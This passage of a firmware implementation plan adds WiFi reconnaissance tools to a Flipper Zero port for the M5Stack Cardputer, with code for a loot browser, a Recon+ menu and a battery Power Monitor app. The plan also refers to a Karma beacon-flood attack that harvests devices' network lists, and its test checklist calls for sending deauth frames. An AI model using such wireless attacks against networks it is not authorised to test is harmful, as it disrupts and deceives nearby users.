        strncpy(app->loot_session, s_sessions[event.event], sizeof(app->loot_session) - 1);
        app->loot_session[sizeof(app->loot_session) - 1] = '\0';
        scene_manager_next_scene(app->scene_manager, WlanAppSceneLootEntries);
        return true;
    }
    return false;
}

void wlan_app_scene_loot_browser_on_exit(void* context) {
    WlanApp* app = context;
    submenu_reset(app->submenu);
}
```

- [ ] **Step 3: Write `scene_loot_entries.c`** — parse `<session>/manifest.csv` with `wlan_manifest_parse_line`, list `time·type·target` rows + any raw non-manifest files; selecting a row sets `app->loot_file` and routes to preview; include a "Delete session" action (confirm + recursive remove, then `scene_manager_previous_scene`).

- [ ] **Step 4: Write `scene_loot_preview.c`** — read `app->loot_file` (cap 2048 B) into `app->text_buf`, show via `widget_add_text_scroll_element(app->widget, ...)`, switch to `WlanAppViewWidget`. On exit, `widget_reset(app->widget)`.

- [ ] **Step 5: Register scenes + fields**

Append to `scene_config.h`:
```c
ADD_SCENE(wlan_app, loot_browser, LootBrowser)
ADD_SCENE(wlan_app, loot_entries, LootEntries)
ADD_SCENE(wlan_app, loot_preview, LootPreview)
```
Add to `struct WlanApp` (in `wlan_app.h`): `char loot_session[64];` and `char loot_file[96];`.

- [ ] **Step 6: Build** → `build_loot.log`; expect success markers.

- [ ] **Step 7: Commit**
```bash
git add applications/main/wlan_app/scenes/scene_loot_browser.c applications/main/wlan_app/scenes/scene_loot_entries.c applications/main/wlan_app/scenes/scene_loot_preview.c applications/main/wlan_app/scenes/scene_config.h applications/main/wlan_app/wlan_app.h
git commit -m "feat(wlan): unified Loot Browser (sessions/entries/preview + delete/wipe)"
```

---

## Task 12 — Feature: "Recon+ ▶" menu wiring

Add one item to the `wlan_app` main menu routing to a new `WlanAppSceneReconMenu` submenu that lists the Part-A WiFi tools (and leaves room for Part B). This is the on-device entry point for Tasks 7–11.

**Files:**
- Modify: `applications/main/wlan_app/scenes/scene_main.c` — add the "Recon+ ▶" item.
- Create: `applications/main/wlan_app/scenes/scene_recon_menu.c` — the submenu.
- Modify: `applications/main/wlan_app/scenes/scene_config.h` — append `ADD_SCENE(wlan_app, recon_menu, ReconMenu)`.

- [ ] **Step 1: Add the main-menu item** — in `scene_main.c`:

Add to `enum MainIndex`: `MainIndexReconPlus = 16,` (after `MainIndexUpdateSd = 15`). In `wlan_app_scene_main_on_enter`, after the "Update SD" `submenu_add_item`, add:
```c
    submenu_add_item(
        app->submenu, "Recon+", MainIndexReconPlus,
        wlan_app_scene_main_submenu_cb, app);
```
In `wlan_app_scene_main_on_event`, add a case:
```c
        case MainIndexReconPlus:
            scene_manager_next_scene(app->scene_manager, WlanAppSceneReconMenu);
            consumed = true;
            break;
```

- [ ] **Step 2: Write the submenu scene** — `applications/main/wlan_app/scenes/scene_recon_menu.c`

```c
#include "../wlan_app.h"

enum ReconIndex {
    ReconIdxSpectrum,
    ReconIdxKarma,
    ReconIdxDetector,
    ReconIdxProbe,
    ReconIdxLoot,
};

static void recon_menu_cb(void* context, uint32_t index) {
    WlanApp* app = context;
    view_dispatcher_send_custom_event(app->view_dispatcher, index);
}

void wlan_app_scene_recon_menu_on_enter(void* context) {
    WlanApp* app = context;
    submenu_reset(app->submenu);
    submenu_set_header_centered(app->submenu, "Recon+");
    submenu_add_item(app->submenu, "Spectrum", ReconIdxSpectrum, recon_menu_cb, app);
    submenu_add_item(app->submenu, "Karma", ReconIdxKarma, recon_menu_cb, app);
    submenu_add_item(app->submenu, "Attack Detector", ReconIdxDetector, recon_menu_cb, app);
    submenu_add_item(app->submenu, "Probe Sniffer", ReconIdxProbe, recon_menu_cb, app);
    submenu_add_item(app->submenu, "Loot", ReconIdxLoot, recon_menu_cb, app);
    view_dispatcher_switch_to_view(app->view_dispatcher, WlanAppViewSubmenu);
}

bool wlan_app_scene_recon_menu_on_event(void* context, SceneManagerEvent event) {
    WlanApp* app = context;
    if(event.type != SceneManagerEventTypeCustom) return false;
    switch(event.event) {
    case ReconIdxSpectrum:
        scene_manager_next_scene(app->scene_manager, WlanAppSceneSpectrum); return true;
    case ReconIdxKarma:
        scene_manager_next_scene(app->scene_manager, WlanAppSceneKarma); return true;
    case ReconIdxDetector:
        scene_manager_next_scene(app->scene_manager, WlanAppSceneAttackDetector); return true;
    case ReconIdxProbe:
        scene_manager_next_scene(app->scene_manager, WlanAppSceneProbeSniffer); return true;
    case ReconIdxLoot:
        scene_manager_next_scene(app->scene_manager, WlanAppSceneLootBrowser); return true;
    default:
        return false;
    }
}

void wlan_app_scene_recon_menu_on_exit(void* context) {
    WlanApp* app = context;
    submenu_reset(app->submenu);
}
```

- [ ] **Step 3: Register scene** — append `ADD_SCENE(wlan_app, recon_menu, ReconMenu)` to `scene_config.h`.

- [ ] **Step 4: Build** → `build_reconmenu.log`; expect success markers.

- [ ] **Step 5: Commit**
```bash
git add applications/main/wlan_app/scenes/scene_main.c applications/main/wlan_app/scenes/scene_recon_menu.c applications/main/wlan_app/scenes/scene_config.h
git commit -m "feat(wlan): Recon+ submenu wiring (Spectrum/Karma/Detector/Probe/Loot)"
```

---

## Task 13 — Feature: Power Monitor desktop app

New standalone app using `power_estimate` (Task 6). Single canvas view polling the `power` service (`power_get_info` → `PowerInfo`) on a ~1 Hz tick: big % + voltage, charge state, rolling voltage/charge curve, and a charge-time / runtime estimate. Registered under the "Tools" loader category.

**Files:**
- Create: `applications/main/power_monitor/application.fam`
- Create: `applications/main/power_monitor/power_monitor.c` (app entry: view dispatcher + power record + 1 Hz tick)
- Create: `applications/main/power_monitor/views/power_view.h`
- Create: `applications/main/power_monitor/views/power_view.c`
- Copy: `applications/main/qrcode/icon.png` → `applications/main/power_monitor/icon.png` (reuse an existing checked-in 10×10 PNG — no Pillow render).
- Modify: `components/loader/loader_menu_categories.c` — add `{"power_monitor", LoaderCategoryTools},` to the "Tools" block of `loader_category_map`.
- (`power_estimate.{c,h}` already exist from Task 6 and auto-compile now that the dir is an app.)

**Interfaces:**
- Consumes: `power.h` (`power_get_info`, `PowerInfo`, `RECORD_POWER`), `power_estimate.h`.

- [ ] **Step 1: `application.fam`** (mirror `qrcode`):

```python
App(
    appid="power_monitor",
    name="Power Monitor",
    apptype=FlipperAppType.MENUEXTERNAL,
    entry_point="power_monitor_app",
    stack_size=2 * 1024,
    icon="A_Clock_14",
    order=90,
    fap_icon="icon.png",
    fap_category="Tools",
    requires=["gui", "power"],
)
```

- [ ] **Step 2: `views/power_view.h`**

```c
#pragma once
#include <gui/view.h>
#include "../power_estimate.h"

typedef struct {
    uint8_t charge_pct;
    float voltage;      // gauge voltage (V)
    int32_t current_ma; // signed gauge current (mA); >0 charging
    bool charging;
    int32_t est_minutes; // -1 if unknown
    PowerCurve curve;    // charge-% history (owned here, copied in on update)
} PowerViewModel;

View* power_view_alloc(void);
void power_view_free(View* v);
// Push a fresh reading; the view pushes charge_pct into its own curve.
void power_view_update(View* v, uint8_t charge_pct, float voltage,
                       int32_t current_ma, bool charging, int32_t est_minutes);
```

- [ ] **Step 3: `views/power_view.c`**

```c
#include "power_view.h"
#include <gui/elements.h>
#include <furi.h>
#include <stdio.h>

static void power_draw(Canvas* canvas, void* model) {
    PowerViewModel* m = model;
    canvas_clear(canvas);
    canvas_set_font(canvas, FontBigNumbers);
    char pct[8];
    snprintf(pct, sizeof(pct), "%u%%", (unsigned)m->charge_pct);
    canvas_draw_str(canvas, 2, 22, pct);

    canvas_set_font(canvas, FontSecondary);
    char line[32];
    snprintf(line, sizeof(line), "%lu.%02luV %s",
             (unsigned long)m->voltage,
             (unsigned long)((m->voltage - (int)m->voltage) * 100),
             m->charging ? "CHG" : "BAT");
    canvas_draw_str(canvas, 60, 12, line);
    snprintf(line, sizeof(line), "%ld mA", (long)m->current_ma);
    canvas_draw_str(canvas, 60, 24, line);
    if(m->est_minutes >= 0) {
        snprintf(line, sizeof(line), "%s %ldh%02ldm",
                 m->charging ? "full in" : "left",
                 (long)(m->est_minutes / 60), (long)(m->est_minutes % 60));
    } else {
        snprintf(line, sizeof(line), "%s --", m->charging ? "full in" : "left");
    }
    canvas_draw_str(canvas, 2, 34, line);

    // Curve: charge % over time in the strip y 40..63, x 2..125.
    canvas_draw_line(canvas, 0, 38, 127, 38);
    uint8_t n = m->curve.filled;
    if(n >= 2) {
        int gx0 = 2, gw = 124, gy0 = 63, gh = 24;
        for(uint8_t i = 1; i < n; i++) {
            int x1 = gx0 + (int)((i - 1) * gw / (n - 1));
            int x2 = gx0 + (int)(i * gw / (n - 1));
            int y1 = gy0 - power_curve_get(&m->curve, (uint8_t)(i - 1)) * gh / 100;
            int y2 = gy0 - power_curve_get(&m->curve, i) * gh / 100;
            canvas_draw_line(canvas, x1, y1, x2, y2);
        }
    }
}

static bool power_input(InputEvent* event, void* ctx) {
    UNUSED(event); UNUSED(ctx);
    return false; // Back exits via the view's previous-callback
}

View* power_view_alloc(void) {
    View* v = view_alloc();
    view_allocate_model(v, ViewModelTypeLocking, sizeof(PowerViewModel));
    with_view_model(v, PowerViewModel * m, { power_curve_reset(&m->curve); m->est_minutes = -1; }, true);
    view_set_draw_callback(v, power_draw);
    view_set_input_callback(v, power_input);
    return v;
}

void power_view_free(View* v) { view_free(v); }

void power_view_update(View* v, uint8_t charge_pct, float voltage,
                       int32_t current_ma, bool charging, int32_t est_minutes) {
    with_view_model(
        v, PowerViewModel * m,
        {
            m->charge_pct = charge_pct;
            m->voltage = voltage;
            m->current_ma = current_ma;
            m->charging = charging;
            m->est_minutes = est_minutes;
            power_curve_push(&m->curve, charge_pct);
        },
        true);
}
```

- [ ] **Step 4: `power_monitor.c`** (app entry; mirror `battery_test_app.c` for the power record + tick)

```c
#include <furi.h>
#include <gui/gui.h>
#include <gui/view_dispatcher.h>
#include <power/power_service/power.h>
#include "views/power_view.h"
#include "power_estimate.h"

#define POWER_MONITOR_CAPACITY_MAH 1400u // Cardputer-ADV nominal pack; tune later

typedef struct {
    Gui* gui;
    ViewDispatcher* view_dispatcher;
    Power* power;
    View* view;
} PowerMonitorApp;

enum { PowerMonitorViewMain = 0 };

static uint32_t power_monitor_exit(void* context) {
    UNUSED(context);
    return VIEW_NONE;
}

static void power_monitor_tick(void* context) {
    PowerMonitorApp* app = context;
    PowerInfo info;
    power_get_info(app->power, &info);
    int32_t current_ma = (int32_t)(info.current_gauge * 1000.0f);
    uint32_t mag = (uint32_t)(current_ma < 0 ? -current_ma : current_ma);
    int32_t est = power_estimate_minutes(
        info.is_charging, mag, POWER_MONITOR_CAPACITY_MAH, info.charge);
    power_view_update(app->view, info.charge, info.voltage_gauge,
                      current_ma, info.is_charging, est);
}

int32_t power_monitor_app(void* p) {
    UNUSED(p);
    PowerMonitorApp* app = malloc(sizeof(PowerMonitorApp));
    app->gui = furi_record_open(RECORD_GUI);
    app->power = furi_record_open(RECORD_POWER);
    app->view_dispatcher = view_dispatcher_alloc();
    app->view = power_view_alloc();
    view_set_previous_callback(app->view, power_monitor_exit);
    view_dispatcher_add_view(app->view_dispatcher, PowerMonitorViewMain, app->view);
    view_dispatcher_set_event_callback_context(app->view_dispatcher, app);
    view_dispatcher_set_tick_event_callback(app->view_dispatcher, power_monitor_tick, 1000);
    view_dispatcher_attach_to_gui(app->view_dispatcher, app->gui, ViewDispatcherTypeFullscreen);

    power_monitor_tick(app); // seed one reading
    view_dispatcher_switch_to_view(app->view_dispatcher, PowerMonitorViewMain);
    view_dispatcher_run(app->view_dispatcher);

    view_dispatcher_remove_view(app->view_dispatcher, PowerMonitorViewMain);
    power_view_free(app->view);
    view_dispatcher_free(app->view_dispatcher);
    furi_record_close(RECORD_POWER);
    furi_record_close(RECORD_GUI);
    free(app);
    return 0;
}
```
> Verify the `power/power_service/power.h` include path resolves in this port (the app-side header is `applications/services/power/power_service/power.h`; `battery_test_app.h` includes it — read that header to copy the exact include line). Adjust the include to match.

- [ ] **Step 5: Copy the icon + register the loader category**

Copy `applications/main/qrcode/icon.png` to `applications/main/power_monitor/icon.png`.
In `components/loader/loader_menu_categories.c`, add to the `// Tools` block:
```c
    {"power_monitor", LoaderCategoryTools},
```

- [ ] **Step 6: Build** → `build_power.log`; expect `Project build complete` + `=== BUILD OK ===` + `EXIT=0`.

- [ ] **Step 7: Commit**
```bash
git add applications/main/power_monitor/ components/loader/loader_menu_categories.c
git commit -m "feat(power): Power Monitor desktop app (Tools category)"
```

---

## Task 14 — Final full-suite verification

- [ ] **Step 1: Re-run every host test** (all six pure modules)

Run from Git Bash at repo root:
```
wsl.exe -- bash -lc "cd '/mnt/c/Users/stone/Downloads/_fzcard_work/Flipper-Zero-meets-M5Stack-Cardputer-1.15' && \
  for t in test_wlan_probe_parse test_wlan_probe_table test_wlan_attack_detect test_wlan_spectrum test_wlan_loot_manifest test_power_estimate; do \
    gcc -Wall -Wextra -o /tmp/$t tests/$t.c && /tmp/$t || exit 1; done && echo ALL_TESTS_OK"
```
Expected: six `... OK` lines then `ALL_TESTS_OK`.

- [ ] **Step 2: Clean full firmware build**

Run: `MSYS_NO_PATHCONV=1 cmd.exe /c "C:\Users\stone\Downloads\_fzcard_work\Flipper-Zero-meets-M5Stack-Cardputer-1.15\build_ci.bat" > build_partA_final.log 2>&1; echo "EXIT=$?"`
Expected: `Project build complete`, `=== BUILD OK ===`, `EXIT=0`.

- [ ] **Step 3: Manual on-device checklist (record in BUGFIXES.md, flashed separately)**

After flashing `Flipper-cardputer_adv-merged.bin` to SD (`E:`) and booting:
1. WiFi app → main menu shows **"Recon+"** below "Update SD".
2. Recon+ → **Spectrum**: waterfall scrolls; Left/Right toggles LOCK/HOP; OK pauses; Up/Down cycles ALL/VULN/HIDDEN.
3. Recon+ → **Karma**: OK starts; harvested count rises near probing devices; beacons/sec climbs; OK stops → a `karma` row appears in the loot manifest.
4. Recon+ → **Attack Detector**: counters update while hopping; run a deauth from another tool → DA/s spikes and an alert row appears.
5. Recon+ → **Probe Sniffer**: `MAC → SSID` lines populate; on exit `probes.csv` exists in the current loot session.
6. Recon+ → **Loot**: sessions list newest-first; open one → manifest rows; preview a file; Delete session + Wipe all prompt before acting.
7. Desktop → Tools → **Power Monitor**: shows %, voltage, mA, charge/runtime estimate, and a moving curve; plug/unplug flips CHG/BAT.

- [ ] **Step 4: Commit the verification note**
```bash
git add BUGFIXES.md
git commit -m "docs: Part A recon/utility pack verification checklist"
```

---

## Self-Review (completed by plan author)

**Spec coverage (Part A, Features 1–6):**
- Feature 1 Spectrum Waterfall → Task 4 (aggregator) + Task 7 (scene/view). Live RSSI strip, scrolling waterfall, Left/Right lock, OK pause, ALL/VULN/HIDDEN filter via one-shot `wlan_hal_scan` tagging — all covered. IMU "dial mode" + SOFT/PMF filter intentionally dropped (per spec).
- Feature 2 Karma → Task 1 (probe parser + SSID set) + Task 8 (HAL worker + scene). Harvest PNL, beacon-flood with random MAC + channel rotation reusing `prepare_beacon_packet`, stats, loot on stop — covered. 64 B TX constraint satisfied (SSID ≤32 fits the 107 B beacon via `esp_wifi_80211_tx`, not `wlan_hal_send_raw`).
- Feature 3 Attack Detector → Task 3 (classifier + evil-twin) + Task 9 (scene/view). Deauth-rate, pwnagotchi, evil-twin, alert list, loot rows — covered.
- Feature 4 Probe Sniffer → Task 1 + Task 2 (MAC→SSID LRU) + Task 10 (scene/view + `probes.csv`) — covered.
- Feature 5 Loot Browser → Task 5 (manifest parser) + Task 11 (three scenes, delete/wipe confirms) — covered.
- Feature 6 Power app → Task 6 (estimator + curve) + Task 13 (app/view/loader category) — covered.
- Menu integration (single "Recon+" item + submenu) → Task 12. Power app under Tools loader category → Task 13.
- Testing strategy: all six named test files present (Tasks 1–6), matching the spec's table.

**Placeholder scan:** The only deliberate placeholders are (a) the `entries_find_count_helper` line in Task 2's test, explicitly flagged for deletion, and (b) the storage-iteration/recursive-remove/confirm details in Task 11, which are gated on a Step-1 "read the existing pattern" because the exact port API (`storage_simply_remove_recursive` vs `storage_common_remove`, widget-confirm vs popup) must be confirmed in-tree rather than guessed. Every code step otherwise ships complete code.

**Type consistency:** `WLAN_PROBE_SSID_MAX` (33) is defined once in `wlan_probe_parse.h` and reused by Tasks 2/3/9/10. `WlanSpectrum`/`WlanSpectrumViewModel`, `WlanHalKarmaStats`, `WlanDetectorViewModel`, `WlanProbeViewModel`, `PowerViewModel`/`PowerCurve` names are consistent between their producing and consuming tasks. Scene enum ids (`WlanAppSceneSpectrum/Karma/AttackDetector/ProbeSniffer/LootBrowser/LootEntries/LootPreview/ReconMenu`) are generated by the exact `ADD_SCENE` lines and referenced verbatim in Task 12's router.

**Known risks flagged inline for implementers:** exact `wlan_hal.c` static flag names (`s_started`/`s_wifi_connected`) and the promiscuous-rx-cb API (Task 8 Step 2); the shared `SpectrumEvt` enum location (Task 7); the `power.h` include path (Task 13 Step 4); and the loot storage APIs (Task 11 Step 1). Each says "verify in-tree before writing."
